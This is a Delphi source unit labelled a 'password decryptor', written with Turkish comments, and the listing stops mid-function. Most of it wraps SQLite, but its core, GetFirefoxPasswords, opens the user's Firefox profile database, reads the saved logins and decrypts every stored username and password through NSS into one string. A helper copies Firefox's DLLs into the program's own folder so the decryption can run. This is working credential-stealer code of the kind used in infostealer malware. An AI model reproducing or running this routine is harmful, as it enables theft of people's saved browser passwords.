{
  password decryptor unit by ap0calypse
  www.ankasecurity.com

}

unit unitFunctions;

{$IFDEF FPC}
  {$MODE DELPHI}
  {$H+}            (* use AnsiString *)
  {$PACKENUM 4}    (* use 4-byte enums *)
  {$PACKRECORDS C} (* C/C++-compatible record packing *)
{$ELSE}
  {$MINENUMSIZE 4} (* use 4-byte enums *)
{$ENDIF}

{$IFDEF FPC}
  {$MODE Delphi}{$H+}
{$ENDIF}

interface

USES WINDOWS,SYSUTILS,CLASSES,DIALOGS;


const
  SQLITE_OK          =  0; // Successful result
  (* beginning-of-error-codes *)
  SQLITE_ERROR       =  1; // SQL error or missing database
  SQLITE_INTERNAL    =  2; // An internal logic error in SQLite
  SQLITE_PERM        =  3; // Access permission denied
  SQLITE_ABORT       =  4; // Callback routine requested an abort
  SQLITE_BUSY        =  5; // The database file is locked
  SQLITE_LOCKED      =  6; // A table in the database is locked
  SQLITE_NOMEM       =  7; // A malloc() failed
  SQLITE_READONLY    =  8; // Attempt to write a readonly database
  SQLITE_INTERRUPT   =  9; // Operation terminated by sqlite3_interrupt()
  SQLITE_IOERR       = 10; // Some kind of disk I/O error occurred
  SQLITE_CORRUPT     = 11; // The database disk image is malformed
  SQLITE_NOTFOUND    = 12; // (Internal Only) Table or record not found
  SQLITE_FULL        = 13; // Insertion failed because database is full
  SQLITE_CANTOPEN    = 14; // Unable to open the database file
  SQLITE_PROTOCOL    = 15; // Database lock protocol error
  SQLITE_EMPTY       = 16; // Database is empty
  SQLITE_SCHEMA      = 17; // The database schema changed
  SQLITE_TOOBIG      = 18; // Too much data for one row of a table
  SQLITE_CONSTRAINT  = 19; // Abort due to contraint violation
  SQLITE_MISMATCH    = 20; // Data type mismatch
  SQLITE_MISUSE      = 21; // Library used incorrectly
  SQLITE_NOLFS       = 22; // Uses OS features not supported on host
  SQLITE_AUTH        = 23; // Authorization denied
  SQLITE_FORMAT      = 24; // Auxiliary database format error
  SQLITE_RANGE       = 25; // 2nd parameter to sqlite3_bind out of range
  SQLITE_NOTADB      = 26; // File opened that is not a database file
  SQLITE_ROW         = 100; // sqlite3_step() has another row ready
  SQLITE_DONE        = 101; // sqlite3_step() has finished executing

  SQLITE_INTEGER = 1;
  SQLITE_FLOAT   = 2;
  SQLITE_TEXT    = 3;
  SQLITE_BLOB    = 4;
  SQLITE_NULL    = 5;

  SQLITE_UTF8     = 1;
  SQLITE_UTF16    = 2;
  SQLITE_UTF16BE  = 3;
  SQLITE_UTF16LE  = 4;
  SQLITE_ANY      = 5;

  SQLITE_STATIC    {: TSQLite3Destructor} = Pointer(0);
  SQLITE_TRANSIENT {: TSQLite3Destructor} = Pointer(-1);

type
TSECItem = packed record
SECItemType: dword;
SECItemData: pchar;
SECItemLen: dword;
end;
PSECItem = ^TSECItem;

type
  TSQLiteDB = Pointer;
  TSQLiteResult = ^PAnsiChar;
  TSQLiteStmt = Pointer;

type
  PPAnsiCharArray = ^TPAnsiCharArray;
  TPAnsiCharArray = array[0 .. (MaxInt div SizeOf(PAnsiChar))-1] of PAnsiChar;

type
  TSQLiteExecCallback = function(UserData: Pointer; NumCols: integer; ColValues:
    PPAnsiCharArray; ColNames: PPAnsiCharArray): integer; cdecl;
  TSQLiteBusyHandlerCallback = function(UserData: Pointer; P2: integer): integer; cdecl;

  //function prototype for define own collate
  TCollateXCompare = function(UserData: pointer; Buf1Len: integer; Buf1: pointer;
    Buf2Len: integer; Buf2: pointer): integer; cdecl;

type
  TSQLite3Destructor = procedure(Ptr: Pointer); cdecl;


const

  dtInt = 1;
  dtNumeric = 2;
  dtStr = 3;
  dtBlob = 4;
  dtNull = 5;

type

  ESQLiteException = class(Exception)
  end;

  TSQliteParam = class
  public
    name: string;
    valuetype: integer;
    valueinteger: int64;
    valuefloat: double;
    valuedata: string;
  end;

  THookQuery = procedure(Sender: TObject; SQL: String) of object;

  TSQLiteQuery = record
    SQL: String;
    Statement: TSQLiteStmt;
  end;

  TSQLiteTable = class;
  TSQLiteUniTable = class;

  TSQLiteDatabase = class
  private
    fDB: TSQLiteDB;
    fInTrans: boolean;
    fSync: boolean;
    fParams: TList;
    FOnQuery: THookQuery;
    procedure RaiseError(s: string; SQL: string);
    procedure SetParams(Stmt: TSQLiteStmt);
    procedure BindData(Stmt: TSQLiteStmt; const Bindings: array of const);
    function GetRowsChanged: integer;
  protected
    procedure SetSynchronised(Value: boolean);
    procedure DoQuery(value: string); 
  public
    constructor Create(const FileName: string);
    destructor Destroy; override;
    function GetTable(const SQL: Ansistring): TSQLiteTable; overload;
    function GetTable(const SQL: Ansistring; const Bindings: array of const): TSQLiteTable; overload;
    procedure ExecSQL(const SQL: Ansistring); overload;
    procedure ExecSQL(const SQL: Ansistring; const Bindings: array of const); overload;
    procedure ExecSQL(Query: TSQLiteQuery); overload;
    function PrepareSQL(const SQL: Ansistring): TSQLiteQuery;
    procedure BindSQL(Query: TSQLiteQuery; const Index: Integer; const Value: Integer); overload;
    procedure BindSQL(Query: TSQLiteQuery; const Index: Integer; const Value: String); overload;
    procedure ReleaseSQL(Query: TSQLiteQuery);
    function GetUniTable(const SQL: Ansistring): TSQLiteUniTable; overload;
    function GetUniTable(const SQL: Ansistring; const Bindings: array of const): TSQLiteUniTable; overload;
    function GetTableValue(const SQL: Ansistring): int64; overload;
    function GetTableValue(const SQL: Ansistring; const Bindings: array of const): int64; overload;
    function GetTableString(const SQL: Ansistring): string; overload;
    function GetTableString(const SQL: Ansistring; const Bindings: array of const): string; overload;
    procedure GetTableStrings(const SQL: Ansistring; const Value: TStrings);
    procedure UpdateBlob(const SQL: Ansistring; BlobData: TStream);
    procedure BeginTransaction;
    procedure Commit;
    procedure Rollback;
    function TableExists(TableName: string): boolean;
    function GetLastInsertRowID: int64;
    function GetLastChangedRows: int64;
    procedure SetTimeout(Value: integer);
    function Version: string;
    procedure AddCustomCollate(name: string; xCompare: TCollateXCompare);
    //adds collate named SYSTEM for correct data sorting by user's locale
    Procedure AddSystemCollate;
    procedure ParamsClear;
    procedure AddParamInt(name: string; value: int64);
    procedure AddParamFloat(name: string; value: double);
    procedure AddParamText(name: string; value: string);
    procedure AddParamNull(name: string);
    property DB: TSQLiteDB read fDB;
  published
    property IsTransactionOpen: boolean read fInTrans;
    //database rows that were changed (or inserted or deleted) by the most recent SQL statement
    property RowsChanged : integer read getRowsChanged;
    property Synchronised: boolean read FSync write SetSynchronised;
    property OnQuery: THookQuery read FOnQuery write FOnQuery;
  end;

  TSQLiteTable = class
  private
    fResults: TList;
    fRowCount: cardinal;
    fColCount: cardinal;
    fCols: TStringList;
    fColTypes: TList;
    fRow: cardinal;
    function GetFields(I: cardinal): string;
    function GetEOF: boolean;
    function GetBOF: boolean;
    function GetColumns(I: integer): string;
    function GetFieldByName(FieldName: string): string;
    function GetFieldIndex(FieldName: string): integer;
    function GetCount: integer;
    function GetCountResult: integer;
  public
    constructor Create(DB: TSQLiteDatabase; const SQL: Ansistring); overload;
    constructor Create(DB: TSQLiteDatabase; const SQL: Ansistring; const Bindings: array of const); overload;
    destructor Destroy; override;
    function FieldAsInteger(I: cardinal): int64;
    function FieldAsBlob(I: cardinal): TMemoryStream;
    function FieldAsBlobText(I: cardinal): string;
    function FieldIsNull(I: cardinal): boolean;
    function FieldAsString(I: cardinal): string;
    function FieldAsDouble(I: cardinal): double;
    function Next: boolean;
    function Previous: boolean;
    property EOF: boolean read GetEOF;
    property BOF: boolean read GetBOF;
    property Fields[I: cardinal]: string read GetFields;
    property FieldByName[FieldName: string]: string read GetFieldByName;
    property FieldIndex[FieldName: string]: integer read GetFieldIndex;
    property Columns[I: integer]: string read GetColumns;
    property ColCount: cardinal read fColCount;
    property RowCount: cardinal read fRowCount;
    property Row: cardinal read fRow;
    function MoveFirst: boolean;
    function MoveLast: boolean;
    function MoveTo(position: cardinal): boolean;
    property Count: integer read GetCount;
    // The property CountResult is used when you execute count(*) queries.
    // It returns 0 if the result set is empty or the value of the
    // first field as an integer.
    property CountResult: integer read GetCountResult;
  end;

  TSQLiteUniTable = class
  private
    fColCount: cardinal;
    fCols: TStringList;
    fRow: cardinal;
    fEOF: boolean;
    fStmt: TSQLiteStmt;
    fDB: TSQLiteDatabase;
    fSQL: string;
    function GetFields(I: cardinal): string;
    function GetColumns(I: integer): string;
    function GetFieldByName(FieldName: string): string;
    function GetFieldIndex(FieldName: string): integer;
  public
    constructor Create(DB: TSQLiteDatabase; const SQL: Ansistring); overload;
    constructor Create(DB: TSQLiteDatabase; const SQL: Ansistring; const Bindings: array of const); overload;
    destructor Destroy; override;
    function FieldAsInteger(I: cardinal): int64;
    function FieldAsBlob(I: cardinal): TMemoryStream;
    function FieldAsBlobPtr(I: cardinal; out iNumBytes: integer): Pointer;
    function FieldAsBlobText(I: cardinal): string;
    function FieldIsNull(I: cardinal): boolean;
    function FieldAsString(I: cardinal): string;
    function FieldAsDouble(I: cardinal): double;
    function Next: boolean;
    property EOF: boolean read FEOF;
    property Fields[I: cardinal]: string read GetFields;
    property FieldByName[FieldName: string]: string read GetFieldByName;
    property FieldIndex[FieldName: string]: integer read GetFieldIndex;
    property Columns[I: integer]: string read GetColumns;
    property ColCount: cardinal read fColCount;
    property Row: cardinal read fRow;
  end;

VAR
SQLite3_Open : function (filename: PAnsiChar; var db: TSQLiteDB): integer; cdecl;
SQLite3_Close : function (db: TSQLiteDB): integer; cdecl;
SQLite3_Exec : function (db: TSQLiteDB; SQLStatement: PAnsiChar; CallbackPtr: TSQLiteExecCallback; UserData: Pointer; var ErrMsg: PAnsiChar): integer; cdecl;
SQLite3_Version : function (): PAnsiChar; cdecl;
SQLite3_ErrMsg : function (db: TSQLiteDB): PAnsiChar; cdecl;
SQLite3_ErrCode : function (db: TSQLiteDB): integer; cdecl;
SQlite3_Free : procedure (P: PAnsiChar); cdecl;
SQLite3_GetTable : function (db: TSQLiteDB; SQLStatement: PAnsiChar; var ResultPtr: TSQLiteResult; var RowCount: Cardinal; var ColCount: Cardinal; var ErrMsg: PAnsiChar): integer; cdecl;
SQLite3_FreeTable : procedure (Table: TSQLiteResult); cdecl;
SQLite3_Complete : function (P: PAnsiChar): boolean; cdecl;
SQLite3_LastInsertRowID : function (db: TSQLiteDB): int64; cdecl;
SQLite3_Interrupt : procedure (db: TSQLiteDB); cdecl;
SQLite3_BusyHandler : procedure (db: TSQLiteDB; CallbackPtr: TSQLiteBusyHandlerCallback; UserData: Pointer); cdecl;
SQLite3_BusyTimeout : procedure (db: TSQLiteDB; TimeOut: integer); cdecl;
SQLite3_Changes : function (db: TSQLiteDB): integer; cdecl;
SQLite3_TotalChanges  :function (db: TSQLiteDB): integer; cdecl;
SQLite3_Prepare : function (db: TSQLiteDB; SQLStatement: PAnsiChar; nBytes: integer; var hStmt: TSqliteStmt; var pzTail: PAnsiChar): integer; cdecl;
SQLite3_Prepare_v2 : function (db: TSQLiteDB; SQLStatement: PAnsiChar; nBytes: integer; var hStmt: TSqliteStmt; var pzTail: PAnsiChar): integer; cdecl;
SQLite3_ColumnCount : function (hStmt: TSqliteStmt): integer; cdecl;
SQLite3_ColumnName : function (hStmt: TSqliteStmt; ColNum: integer): PAnsiChar; cdecl;
SQLite3_ColumnDeclType : function (hStmt: TSqliteStmt; ColNum: integer): PAnsiChar; cdecl;
SQLite3_Step : function (hStmt: TSqliteStmt): integer; cdecl;
SQLite3_DataCount : function (hStmt: TSqliteStmt): integer; cdecl;
SQLite3_ColumnBlob : function (hStmt: TSqliteStmt; ColNum: integer): pointer; cdecl;
SQLite3_ColumnBytes: function (hStmt: TSqliteStmt; ColNum: integer): integer; cdecl;
SQLite3_ColumnDouble : function (hStmt: TSqliteStmt; ColNum: integer): double; cdecl;
SQLite3_ColumnInt : function (hStmt: TSqliteStmt; ColNum: integer): integer; cdecl;
SQLite3_ColumnText : function (hStmt: TSqliteStmt; ColNum: integer): PAnsiChar; cdecl;
SQLite3_ColumnType : function (hStmt: TSqliteStmt; ColNum: integer): integer; cdecl;
SQLite3_ColumnInt64 : function (hStmt: TSqliteStmt; ColNum: integer): Int64; cdecl;
SQLite3_Finalize  :function (hStmt: TSqliteStmt): integer; cdecl;
SQLite3_Reset : function (hStmt: TSqliteStmt): integer; cdecl;
sqlite3_bind_blob : function (hStmt: TSqliteStmt; ParamNum: integer;  ptrData: pointer; numBytes: integer; ptrDestructor: TSQLite3Destructor): integer;cdecl;
sqlite3_bind_text : function (hStmt: TSqliteStmt; ParamNum: integer;   Text: PAnsiChar; numBytes: integer; ptrDestructor: TSQLite3Destructor): integer; cdecl;
sqlite3_bind_double : function (hStmt: TSqliteStmt; ParamNum: integer; Data: Double): integer;  cdecl;
sqlite3_bind_int : function (hStmt: TSqLiteStmt; ParamNum: integer; Data: integer): integer;   cdecl;
sqlite3_bind_int64 : function (hStmt: TSqliteStmt; ParamNum: integer; Data: int64): integer;  cdecl;
sqlite3_bind_null : function (hStmt: TSqliteStmt; ParamNum: integer): integer;  cdecl;
sqlite3_bind_parameter_index : function (hStmt: TSqliteStmt; zName: PAnsiChar): integer;   cdecl;
sqlite3_enable_shared_cache : function (Value: integer): integer; cdecl;
SQLite3_create_collation : function (db: TSQLiteDB; Name: PAnsiChar; eTextRep: integer;  UserData: pointer; xCompare: TCollateXCompare): integer; cdecl;



NSS_Init: function(configdir: pchar): dword; cdecl;
NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
PK11_GetInternalKeySlot: function: pointer; cdecl;
PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
NSS_Shutdown: procedure; cdecl;
PK11_FreeSlot: procedure(slot: pointer); cdecl;

// PSAPI
 GetModuleFileNameExA : function (hProcess: THandle; hModule: HMODULE; lpFilename: PAnsiChar; nSize: DWORD): DWORD stdcall;


Function GetFirefoxPasswords : String;
Procedure DinamikApileriYukle;
Function ExecuteProgram(ProgramName : String;Var PID : CARDINAL) : Boolean;
function SQLiteFieldType(SQLiteFieldTypeCode: Integer): AnsiString;
function SQLiteErrorStr(SQLiteErrorCode: Integer): AnsiString;
procedure DisposePointer(ptr: pointer); cdecl;
function ReadKeyToString(hRoot:HKEY; sKey:string; sSubKey:string):string;
function SystemCollate(Userdta: pointer; Buf1Len: integer; Buf1: pointer;Buf2Len: integer; Buf2: pointer): integer; cdecl;
implementation

function ReadKeyToString(hRoot:HKEY; sKey:string; sSubKey:string):string;
var
hOpen: HKEY;
sBuff: array[0..255] of char;
dSize: integer;
BEGIN
if (RegOpenKeyEx(hRoot, PChar(sKey), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS) then
BEGIN
dSize := SizeOf(sBuff);
RegQueryValueEx(hOpen, PChar(sSubKey), nil, nil, @sBuff, @dSize);
Result := sBuff
end;
RegCloseKey(hOpen);
end;

Function ExecuteProgram(ProgramName : String;Var PID : CARDINAL) : Boolean;
var
  StartInfo  : TStartupInfo;
  ProcInfo   : TProcessInformation;
  CreateOK   : Boolean;
BEGIN
  FillChar(StartInfo,SizeOf(TStartupInfo),#0);
  FillChar(ProcInfo,SizeOf(TProcessInformation),#0);
  StartInfo.cb := SizeOf(TStartupInfo);

  WinExec(PCHAR(ProgramName),SW_SHOW);
  CreateOK := CreateProcess(pchar(ProgramName),'', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);

  if CreateOK then
  BEGIN
      PID := ProcInfo.dwProcessId;
      Result := TRUE;
  END
  ELSE
  BEGIN
      PID := 0;
      Result := FALSE;
  END;

end;

function PidToPath(Pid: integer): string;
var
  ProcessHandle: THandle;
  Buf: array[0..MAX_PATH] of char;
BEGIN
  ProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or  PROCESS_VM_READ,   False,Pid);
  GetModuleFileNameExA(ProcessHandle,0,Buf,MAX_PATH);
  Result := String(Buf);
  CloseHandle(ProcessHandle);
end;

Function GetFirefoxPasswords : String;   // 3.x 4.x
VAR
  hToken: THandle;
  ProfilePath: array [0..MAX_PATH] of char;
  ProfilePathLen: dword;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  SQLiteDatabase: TSQLiteDatabase;
  SQLIteTable: TSQLIteTable;
  KeySlot: pointer;
  i:integer;
  username,password:string;
BEGIN


    OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
    ProfilePathLen := MAX_PATH;
    ZeroMemory(@ProfilePath, MAX_PATH);
    GetEnvironmentVariable('APPDATA',ProfilePath,ProfilePathLen);
    FirefoxProfilePath := pchar(profilePath +'\Mozilla\Firefox\profiles.ini');
    GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
    MainProfilePath := pchar(profilePath + '\Mozilla\Firefox\' + mainProfile + '\' + 'signons.sqlite');
    SQLiteDatabase := TSQLiteDatabase.Create(MainProfilePath);
    SQLIteTable := SQLiteDatabase.GetTable('SELECT * FROM moz_logins');


    IF SQLIteTable.Count > 0 THEN
    BEGIN
      if NSS_Init(pchar(profilePath + '\Mozilla\Firefox\' + mainProfile)) = 0 then
        begin
          KeySlot := PK11_GetInternalKeySlot;
            if KeySlot <> nil then
              begin
                  if PK11_Authenticate(KeySlot, True, nil) = 0 then
                  begin

                      FOR i := 0 to SQLIteTable.Count -1 DO
                      BEGIN
                        result := result + SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['hostname']) + '|';
                        username:= SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedUsername']);
                        Password := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedPassword']);
                        NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Username), Length(Username));
                        PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
                        Result := result + DecryptedSECItem.SECItemData + '|';
                        NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Password), Length(Password));
                        PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
                        Result := result + DecryptedSECItem.SECItemData + '|';
                        SQLIteTable.Next;
                      END;
                 END ELSE
                    result:= result+  'PK11_Authenticate Failed!';
                    PK11_FreeSlot(KeySlot);
                 END ELSE
                    result:= result+  'PK11_GetInternalKeySlot Failed!';
                    NSS_Shutdown;
                 END ELSE
                    result:= result+  'NSS_Init Failed!';
    END;
    SQLIteTable.Free;
    SQLiteDatabase.Free;
END;

procedure CopySelectedFiles(FolderPath : String;SelfPath : String;FileExt: String);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  FolderPath := includetrailingbackslash(FolderPath);
  SelfPath := includetrailingbackslash(SelfPath);


  hFind := FindFirstFile(pchar(FolderPath + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  IF FindData.dwFileAttributes and $00000010 = 0 then begin // KLASOR DEGILSE
    IF Pos(FileExt,FindData.cFileName)>0 THEN
    BEGIN
       Windows.CopyFile(PCHAR(FolderPath + FindData.cFileName),PCHAR(SelfPath + FindData.cFileName),FALSE);
    END;
  end;

  while FindNextFile(hFind, FindData) do begin

  IF FindData.dwFileAttributes and $00000010 = 0 then begin // KLASOR DEGILSE
    IF Pos(FileExt,FindData.cFileName)>0 THEN
    BEGIN
       Windows.CopyFile(PCHAR(FolderPath + FindData.cFileName),PCHAR(SelfPath + FindData.cFileName),FALSE);
    END;
  end;

  end;
  Windows.FindClose(hFind);
end;

Procedure DinamikApileriYukle;
VAR
  STRSQLiteDLL : STRING;
  STRNSSDLL    : STRING;
  DLLSQLITEHandle : CARDINAL;
  DLLNSSModule : CARDINAL;
  STRPSAPIDLL : STRING;
  DLLPSAPIDLLHANDLE : CARDINAL;

  PID : CARDINAL;

  FIREFOXVER : STRING;
  FIREFOXPATH : STRING;
  FIREFOXREG : STRING;
BEGIN



  STRPSAPIDLL := 'PSAPI.dll';
  DLLPSAPIDLLHANDLE := LoadLibrary(pchar(STRPSAPIDLL));


   @GetModuleFileNameExA := GetProcAddress(DLLPSAPIDLLHANDLE, 'GetModuleFileNameExA');
   FIREFOXREG := 'Mozilla\Mozilla Firefox';
   FIREFOXVER := ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\' + FIREFOXREG , 'CurrentVersion');

   // EGER FIREFOX YUKLU ISE
   IF FIREFOXVER <> '' THEN
   BEGIN
     FIREFOXPATH := ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\' + FIREFOXREG + '\' + FIREFOXVER + '\Main', 'PathToExe');

     IF FileExists(FIREFOXPATH)= TRUE THEN
     BEGIN
      // FireFox un Klasorunde Yer Alan Tum DLL Dosyalarini Kendi Dizinimize Kopyalicaz.
        CopySelectedFiles(ExtractFilePath(FIREFOXPATH),EXTRACTFILEPATH(PARAMSTR(0)),'dll');
     END;
   END;

   
IF FileExists('sqlite3.dll') THEN  // FOR 3X
BEGIN
     STRSQLiteDLL :='sqlite3.dll';
END
ELSE IF FileExists('mozsqlite3.dll') THEN // FOR 4x
BEGIN
     STRSQLiteDLL :='mozsqlite3.dll';
END
ELSE
BEGIN
   STRSQLiteDLL := ''; // NOT FOUND
END;


IF STRSQLiteDLL<>''  THEN // SQLITE3.dLL LOADED SUCCESSFULLY
BEGIN
    dllSQLITEHandle := LoadLibrary(PCHAR(STRSQLiteDLL));
    @SQLite3_Open := GetProcAddress(dllSQLITEHandle,'sqlite3_open');
    @SQLite3_Close := GetProcAddress(dllSQLITEHandle,'sqlite3_close');
    @SQLite3_Exec := GetProcAddress(dllSQLITEHandle,'sqlite3_exec');
    @SQLite3_Version := GetProcAddress(dllSQLITEHandle, 'sqlite3_libversion');
    @SQLite3_ErrMsg := GetProcAddress(dllSQLITEHandle, 'sqlite3_errmsg');
    @SQLite3_ErrCode := GetProcAddress(dllSQLITEHandle, 'sqlite3_errcode');
    @SQLite3_Free := GetProcAddress(dllSQLITEHandle, 'sqlite3_free');
    @SQLite3_GetTable := GetProcAddress(dllSQLITEHandle,'sqlite3_get_table');
    @SQLite3_FreeTable := GetProcAddress(dllSQLITEHandle,'sqlite3_free_table');
    @SQLite3_Complete := GetProcAddress(dllSQLITEHandle, 'sqlite3_complete');
    @SQLite3_LastInsertRowID := GetProcAddress(dllSQLITEHandle,'sqlite3_last_insert_rowid');
    @SQLite3_Interrupt := GetProcAddress(dllSQLITEHandle,'sqlite3_interrupt');
    @SQLite3_BusyHandler := GetProcAddress(dllSQLITEHandle,'sqlite3_busy_handler');
    @SQLite3_BusyTimeout := GetProcAddress(dllSQLITEHandle,'sqlite3_busy_timeout');
    @SQLite3_Changes := GetProcAddress(dllSQLITEHandle,'sqlite3_changes');
    @SQLite3_TotalChanges  := GetProcAddress(dllSQLITEHandle,'sqlite3_total_changes');
    @SQLite3_Prepare := GetProcAddress(dllSQLITEHandle, 'sqlite3_prepare');
    @SQLite3_Prepare_v2 := GetProcAddress(dllSQLITEHandle,'sqlite3_prepare_v2');
    @SQLite3_ColumnCount := GetProcAddress(dllSQLITEHandle,'sqlite3_column_count');
    @SQLite3_ColumnName := GetProcAddress(dllSQLITEHandle,'sqlite3_column_name');
    @SQLite3_ColumnDeclType := GetProcAddress(dllSQLITEHandle, 'sqlite3_column_decltype');
    @SQLite3_Step := GetProcAddress(dllSQLITEHandle, 'sqlite3_step');
    @SQLite3_DataCount := GetProcAddress(dllSQLITEHandle, 'sqlite3_data_count');
    @SQLite3_ColumnBlob := GetProcAddress(dllSQLITEHandle,  'sqlite3_column_blob');
    @SQLite3_ColumnBytes:= GetProcAddress(dllSQLITEHandle, 'sqlite3_column_bytes');
    @SQLite3_ColumnDouble := GetProcAddress(dllSQLITEHandle, 'sqlite3_column_double');
    @SQLite3_ColumnInt := GetProcAddress(dllSQLITEHandle, 'sqlite3_column_int');
    @SQLite3_ColumnText := GetProcAddress(dllSQLITEHandle, 'sqlite3_column_text');
    @SQLite3_ColumnType := GetProcAddress(dllSQLITEHandle, 'sqlite3_column_type');
    @SQLite3_ColumnInt64 := GetProcAddress(dllSQLITEHandle, 'sqlite3_column_int64');
    @SQLite3_Finalize  := GetProcAddress(dllSQLITEHandle, 'sqlite3_finalize');
    @SQLite3_Reset := GetProcAddress(dllSQLITEHandle, 'sqlite3_reset');
    @SQLite3_bind_blob := GetProcAddress(dllSQLITEHandle,  'sqlite3_bind_blob');
    @SQLite3_bind_text := GetProcAddress(dllSQLITEHandle,  'sqlite3_bind_text');
    @SQLite3_bind_double := GetProcAddress(dllSQLITEHandle, 'sqlite3_bind_double');
    @SQLite3_bind_int := GetProcAddress(dllSQLITEHandle, 'sqlite3_bind_int');
    @SQLite3_bind_int64 := GetProcAddress(dllSQLITEHandle, 'sqlite3_bind_int64');
    @SQLite3_bind_null := GetProcAddress(dllSQLITEHandle,  'sqlite3_bind_null');
    @SQLite3_bind_parameter_index := GetProcAddress(dllSQLITEHandle, 'sqlite3_bind_parameter_index');
    @SQLite3_enable_shared_cache := GetProcAddress(dllSQLITEHandle, 'sqlite3_enable_shared_cache');
    @SQLite3_create_collation := GetProcAddress(dllSQLITEHandle,  'sqlite3_create_collation');
END;


STRNSSDLL := 'nss3.dll';
IF FILEEXISTS(STRNSSDLL) THEN
BEGIN
    DLLNSSModule := LoadLibrary(pchar(STRNSSDLL));
    @NSS_Init := GetProcAddress(DLLNSSModule, pchar('NSS_Init'));
    @NSSBase64_DecodeBuffer := GetProcAddress(DLLNSSModule, pchar('NSSBase64_DecodeBuffer'));
    @PK11_GetInternalKeySlot := GetProcAddress(DLLNSSModule, pchar('PK11_GetInternalKeySlot'));
    @PK11_Authenticate := GetProcAddress(DLLNSSModule, pchar('PK11_Authenticate'));
    @PK11SDR_Decrypt := GetProcAddress(DLLNSSModule, pchar('PK11SDR_Decrypt'));
    @NSS_Shutdown := GetProcAddress(DLLNSSModule, pchar('NSS_Shutdown'));
    @PK11_FreeSlot := GetProcAddress(DLLNSSModule, pchar('PK11_FreeSlot'));
END;



END;


function SQLiteFieldType(SQLiteFieldTypeCode: Integer): AnsiString;
begin
  case SQLiteFieldTypeCode of
    SQLITE_INTEGER: Result := 'Integer';
    SQLITE_FLOAT: Result := 'Float';
    SQLITE_TEXT: Result := 'Text';
    SQLITE_BLOB: Result := 'Blob';
    SQLITE_NULL: Result := 'Null';
  else
    Result := 'Unknown SQLite Field Type Code "' + IntToStr(SQLiteFieldTypeCode) + '"';
  end;
end;

function SQLiteErrorStr(SQLiteErrorCode: Integer): AnsiString;
begin
  case SQLiteErrorCode of
    SQLITE_OK: Result := 'Successful result';
    SQLITE_ERROR: Result := 'SQL error or missing database';
    SQLITE_INTERNAL: Result := 'An internal logic error in SQLite';
    SQLITE_PERM: Result := 'Access permission denied';
    SQLITE_ABORT: Result := 'Callback routine requested an abort';
    SQLITE_BUSY: Result := 'The database file is locked';
    SQLITE_LOCKED: Result := 'A table in the database is locked';
    SQLITE_NOMEM: Result := 'A malloc() failed';
    SQLITE_READONLY: Result := 'Attempt to write a readonly database';
    SQLITE_INTERRUPT: Result := 'Operation terminated by sqlite3_interrupt()';
    SQLITE_IOERR: Result := 'Some kind of disk I/O error occurred';
    SQLITE_CORRUPT: Result := 'The database disk image is malformed';
    SQLITE_NOTFOUND: Result := '(Internal Only) Table or record not found';
    SQLITE_FULL: Result := 'Insertion failed because database is full';
    SQLITE_CANTOPEN: Result := 'Unable to open the database file';
    SQLITE_PROTOCOL: Result := 'Database lock protocol error';
    SQLITE_EMPTY: Result := 'Database is empty';
    SQLITE_SCHEMA: Result := 'The database schema changed';
    SQLITE_TOOBIG: Result := 'Too much data for one row of a table';
    SQLITE_CONSTRAINT: Result := 'Abort due to contraint violation';
    SQLITE_MISMATCH: Result := 'Data type mismatch';
    SQLITE_MISUSE: Result := 'Library used incorrectly';
    SQLITE_NOLFS: Result := 'Uses OS features not supported on host';
    SQLITE_AUTH: Result := 'Authorization denied';
    SQLITE_FORMAT: Result := 'Auxiliary database format error';
    SQLITE_RANGE: Result := '2nd parameter to sqlite3_bind out of range';
    SQLITE_NOTADB: Result := 'File opened that is not a database file';
    SQLITE_ROW: Result := 'sqlite3_step() has another row ready';
    SQLITE_DONE: Result := 'sqlite3_step() has finished executing';
  else
    Result := 'Unknown SQLite Error Code "' + IntToStr(SQLiteErrorCode) + '"';
  end;
end;

function ColValueToStr(Value: PAnsiChar): AnsiString;
begin
  if (Value = nil) then
    Result := 'NULL'
  else
    Result := Value;
end;

procedure DisposePointer(ptr: pointer); cdecl;
begin
  if assigned(ptr) then
    freemem(ptr);
end;

{$IFDEF WIN32}
function SystemCollate(Userdta: pointer; Buf1Len: integer; Buf1: pointer;
    Buf2Len: integer; Buf2: pointer): integer; cdecl;
begin
  Result := CompareStringW(LOCALE_USER_DEFAULT, 0, PWideChar(Buf1), Buf1Len,
    PWideChar(Buf2), Buf2Len) - 2;
end;
{$ENDIF}

//------------------------------------------------------------------------------
// TSQLiteDatabase
//------------------------------------------------------------------------------

constructor TSQLiteDatabase.Create(const FileName: string);
var
  Msg: PAnsiChar;
  iResult: integer;
  utf8FileName: UTF8string;
begin
  inherited Create;
  fParams := TList.Create;

  self.fInTrans := False;

  Msg := nil;
  try
    utf8FileName := UTF8String(FileName);
    iResult := SQLite3_Open(PAnsiChar(utf8FileName), Fdb);

    if iResult <> SQLITE_OK then
      if Assigned(Fdb) then
      begin
        Msg := Sqlite3_ErrMsg(Fdb);
        raise ESqliteException.CreateFmt('Failed to open database "%s" : %s',
          [FileName, Msg]);
      end
      else
        raise ESqliteException.CreateFmt('Failed to open database "%s" : unknown error',
